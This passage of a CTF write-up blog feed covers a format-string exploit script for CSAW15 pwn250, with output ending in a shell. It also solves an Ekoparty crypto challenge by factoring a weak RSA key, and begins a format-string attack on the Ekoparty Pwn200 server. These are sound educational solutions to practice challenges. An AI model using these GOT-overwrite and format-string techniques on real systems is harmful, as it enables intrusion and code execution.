</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLAH&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># create contact 3 (used in write)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLAH&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># create contact 4 (used as payload for system())</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLAH&#39;</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># 00064c10 W puts</span>
</span><span class='line'>  <span class="c"># 00075b30 malloc</span>
</span><span class='line'>  <span class="c"># 0004cc40 T print</span>
</span><span class='line'>  
</span><span class='line'>  
</span><span class='line'>  <span class="n">malloc</span> <span class="o">=</span> <span class="n">leak4</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] malloc @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">libc</span> <span class="o">=</span> <span class="n">malloc</span> <span class="o">-</span> <span class="mh">0x0075b30</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># 0003fcd0 W system</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x003fcd0</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] system @ &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] overwriting memset@got with system the hard way&quot;</span>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mh">0x804b03c</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] deleting element&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;remove?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span><span class="o">=</span><span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span><span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">csaw15</span><span class="o">/</span><span class="n">pwn250</span><span class="err">$</span> <span class="n">python</span> <span class="o">./</span><span class="n">pwn250poc</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="n">leaking</span> <span class="mh">0x804b020</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">malloc</span> <span class="err">@</span> <span class="mh">0xf7619b30</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">libc</span> <span class="err">@</span> <span class="mh">0xf75a4000</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0xf75e3cd0</span>
</span><span class='line'><span class="n">waiting</span><span class="o">...</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">overwriting</span> <span class="n">memset</span><span class="nd">@got</span> <span class="k">with</span> <span class="n">system</span> <span class="n">the</span> <span class="n">hard</span> <span class="n">way</span>
</span><span class='line'><span class="n">writing</span> <span class="mh">0x804b03c</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;ffade868&#39;</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x68</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Menu</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span><span class="n">Create</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span><span class="n">Remove</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span><span class="n">Edit</span> <span class="n">contact</span>
</span><span class='line'><span class="mi">4</span><span class="p">)</span><span class="n">Display</span> <span class="n">contacts</span>
</span><span class='line'><span class="mi">5</span><span class="p">)</span><span class="n">Exit</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">deleting</span> <span class="n">element</span>
</span><span class='line'><span class="n">Name</span> <span class="n">to</span> <span class="n">remove</span><span class="err">?</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">ctf</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">ctf</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">ctf</span><span class="p">)</span>
</span><span class='line'><span class="n">cd</span>
</span><span class='line'><span class="n">ls</span>
</span><span class='line'><span class="n">contacts_54f3188f64e548565bc1b87d7aa07427</span>
</span><span class='line'><span class="n">flag</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span>
</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">f0rm47_s7r1ng5_4r3_fun_57uff</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Gotta love format string vulnerabilities. The flag was <code>flag{f0rm47_s7r1ng5_4r3_fun_57uff}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Cry100]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100/"/>
    <updated>2015-09-21T23:54:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-cry100</id>
    <content type="html"><![CDATA[<p>We&rsquo;re given a public key and a encrypted flag, with the task to get the private key. I&rsquo;m not very good at crypto challenges so I wanted to see if I could break this one and learn something in the process.</p>

<!--more-->


<p>The public key is an RSA key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl rsa -inform PEM -pubin -in public.key -text -noout
</span><span class='line'>Public-Key: <span class="o">(</span><span class="m">2070</span> bit<span class="o">)</span>
</span><span class='line'>Modulus:
</span><span class='line'>    25:b1:8b:f5:f3:89:09:7d:17:23:78:66:bb:51:cf:
</span><span class='line'>    f8:de:92:24:53:74:9e:bc:40:3b:09:95:c9:7c:0e:
</span><span class='line'>    38:6d:46:c1:61:ca:df:f7:7c:69:86:0d:ae:47:91:
</span><span class='line'>    c2:14:cf:84:87:aa:aa:9f:26:e9:20:a9:77:83:49:
</span><span class='line'>    06:03:8a:ef:b5:c3:08:27:df:cf:3f:c9:e9:76:95:
</span><span class='line'>    44:f9:4e:07:cd:fe:08:72:03:9a:3a:62:62:11:66:
</span><span class='line'>    78:b2:61:fb:2d:6b:9d:32:53:9e:92:a1:53:b3:67:
</span><span class='line'>    56:29:ba:b3:94:2e:7d:35:e3:0f:7e:ef:5a:bf:1c:
</span><span class='line'>    50:d7:97:d0:cc:88:e1:bd:cc:fd:1a:12:ea:6f:7e:
</span><span class='line'>    f7:5c:37:27:db:df:2e:78:0f:34:28:ae:8f:7a:4f:
</span><span class='line'>    b7:a8:9f:18:4a:36:50:32:b1:53:f8:42:5e:84:57:
</span><span class='line'>    50:eb:2b:7a:bc:02:dc:15:ce:02:07:50:7a:a9:50:
</span><span class='line'>    86:3b:b8:48:0a:78:02:8d:d6:29:79:94:4d:6c:63:
</span><span class='line'>    3f:af:a1:03:e4:db:28:ce:87:f5:a0:c6:ed:4a:2f:
</span><span class='line'>    26:64:42:7f:56:5c:77:81:ab:61:91:45:6d:97:1c:
</span><span class='line'>    7f:fa:39:52:72:37:4c:ec:01:55:e5:f9:11:89:db:
</span><span class='line'>    74:2e:4c:28:b0:3a:0f:a1:1c:ff:b0:31:73:d2:a4:
</span><span class='line'>    cc:e6:ae:53
</span><span class='line'>Exponent: <span class="m">65537</span> <span class="o">(</span>0x10001<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It has a rather weird number of bits, not a multiple of 256. The modulus is converted to hex using python and yields:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">n</span> <span class="o">=</span> 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443
</span></code></pre></td></tr></table></div></figure>


<p>Hmm. Since the modulus <code>n</code> is made from the product of two primes, we&rsquo;d better find those primes. Luckily, I found another <a href="http://hacktracking.blogspot.nl/2013/11/cscamp-ctf-quals-2k13-crypto-public-is.html">writeup</a> and a website called <a href="http://factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443">factordb.com</a>. Factordb does <em>exactly</em> what it says on the box and yields two factors, <code>3133337</code> and another large number. The first number made me think I was on the right way!</p>

<p>Now, we need to reconstruct the key. We have <code>n</code>, <code>p</code> and <code>q</code> which is all we need. I couldn&rsquo;t decrypt the message in Python, as Python&rsquo;s cryptolib requires the modulus to be a multiple of 256 bits. So I resorted to the voodoo magic that is <code>openssl</code>. I found this nice post on stackoverflow <a href="https://stackoverflow.com/questions/19850283/how-to-generate-rsa-keys-using-specific-input-numbers-in-openssl">about creating specific rsa keys</a>.</p>

<p>I followed that post, computing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>d mod<span class="o">(</span>p-1<span class="o">)</span> <span class="o">=</span> e1
</span><span class='line'>d mod<span class="o">(</span>q-1<span class="o">)</span> <span class="o">=</span> e2
</span><span class='line'>q^-1 mod <span class="nv">p</span> <span class="o">=</span> coeff
</span></code></pre></td></tr></table></div></figure>


<p>for which I needed</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then I put everything in a file called <code>newkey.der</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">asn1</span><span class="o">=</span><span class="n">SEQUENCE</span><span class="p">:</span><span class="n">rsa_key</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="n">rsa_key</span><span class="p">]</span>
</span><span class='line'><span class="n">version</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">0</span>
</span><span class='line'><span class="n">modulus</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span>
</span><span class='line'><span class="n">pubExp</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">65537</span>  
</span><span class='line'><span class="n">privExp</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">406853230956379689450620815713768871010712825839536410687962650677800895818003893712259622281477453292088146173840036827322518131453630576229976208523593618949818777897059256426591560532784635697190752924923710375949616954069804342573867253630978123632384795587951365482103468722384133084798614863870775897915929475258974188300927376911833763105616386167881813301748585233563049693794370642976326692672223638908164822104832415788577945314264232531947860576966629150456995512932232264881080618006698700677529111454508900582785420549466798020451488168615035256292977390692401388790460066327347700109341639992159475755036449</span>
</span><span class='line'><span class="n">p</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span>
</span><span class='line'><span class="n">q</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">3133337</span>
</span><span class='line'><span class="n">e1</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">15320351458978192768467039741691432413958180349660930794740289485182452764579534136107456333762920952821710744567765011085892394594373698903583015958298729593743757394184665648601970820474550408544396720336394444082148339685815042712020243239641617201526913490150693257135882730015443734409342942381805505660243891614007699009146733904940642377373537806159587666380328759209553248526202577679304907571591265191240376778645354498599063176881375334380848007142765855272411310242667619720799140338871500103278100940728801960485534826631133256077779493381175185896255651752489800973249824932460228998596930117032675866465</span>
</span><span class='line'><span class="n">e2</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">817841</span>
</span><span class='line'><span class="n">coeff</span><span class="o">=</span><span class="n">INTEGER</span><span class="p">:</span><span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>privExp</code> was calculated like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">gmpy</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
</span><span class='line'>  <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</span><span class='line'>      
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="mi">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span>
</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="mi">3133337</span>
</span><span class='line'><span class="n">totien</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">totien</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">d</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then ran <code>$ openssl asn1parse -genconf  newkey.der -out key.der</code>. After mucking around with the flag, I verified I had the right private key by encrypting a test message with the public key. I noticed that the flag was base64 encoded whereas my encrypted message wasn&rsquo;t&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat flag.enc <span class="p">|</span>base64 -d &gt; test.enc
</span><span class='line'><span class="nv">$ </span>openssl rsautl -in test.enc -out /dev/tty -inkey private.key -decrypt -oaep
</span><span class='line'>EKO<span class="o">{</span>classic_rsa_challenge_is_boring_but_necessary<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>That last <code>openssl</code> command was just tested with <code>-raw</code> and -<code>oaep</code> (options for padding). <code>-oaep</code> worked!</p>

<p>Flag was <code>EKO{classic_rsa_challenge_is_boring_but_necessary}</code>. I learned something \o/</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
    <updated>2015-09-21T23:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>

<!--more-->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc challs.ctf.site 20002
</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
</span><span class='line'>[!] Type bye to quit
</span><span class='line'>Enter your name: %17$s
</span><span class='line'>Hi 3k0_p4rty_2015!</span></code></pre></td></tr></table></div></figure>


<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>

<p>bAAAA%8$x</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc challs.ctf.site 20002
</span><span class='line'>&lt;Simple loop greetings v1.3.3.7&gt;
</span><span class='line'>[!] Type bye to quit
</span><span class='line'>Enter your name: bAAAA%8$x
</span><span class='line'>Hi bAAAA41414141</span></code></pre></td></tr></table></div></figure>


